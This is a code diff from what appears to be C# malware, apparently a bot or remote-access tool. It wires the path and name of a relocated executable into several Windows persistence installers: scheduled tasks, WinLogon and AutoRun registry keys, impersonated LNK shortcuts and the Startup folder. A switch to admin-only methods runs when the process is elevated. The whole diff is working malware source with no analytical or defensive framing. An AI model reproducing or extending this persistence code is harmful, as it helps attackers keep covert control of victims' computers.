@@ -143,7 +143,7 @@ namespace Main.Source
 
             string newExecItself = foundFiles.First();
 
-            Persist();
+            Persist(newName, newExecItself);
 
             var procInfo = new ProcessStartInfo
             {
@@ -170,18 +170,18 @@ namespace Main.Source
             await Bot.Manager.StartAsync();
         }
 
-        private static void Persist()
+        private static void Persist(string name, string path)
         {
             if (Common.IsElevated() && ConfigOptions.ADMIN_CUSTOM_PERSISTENCE)
             {
                 switch (ConfigOptions.PERSISTENCE_METHOD)
                 {
                     case PersistMethod.TaskScheduler:
-                        Utilities.Persistence.TaskScheduler.Install("", "");
+                        Functions.Persistence.TaskScheduler.Install(name, path);
                         return;
 
                     case PersistMethod.WinLogonRegKey:
-                        Utilities.Persistence.WinLogon.Install("");
+                        Functions.Persistence.WinLogon.Install(path);
                         return;
                 }
             }
@@ -189,15 +189,15 @@ namespace Main.Source
             switch (ConfigOptions.PERSISTENCE_METHOD)
             {
                 case PersistMethod.AutoRunRegKey:
-                    Utilities.Persistence.AutoRun.Install("", "");
+                    Functions.Persistence.AutoRun.Install(name, path);
                     return;
 
                 case PersistMethod.ImpersonateLNK:
-                    Utilities.Persistence.ImpersonateLNKs.Install("");
+                    Functions.Persistence.ImpersonateLNKs.Install(path);
                     return;
 
                 case PersistMethod.StartFolder:
-
+                    
                     return;
             }
         }
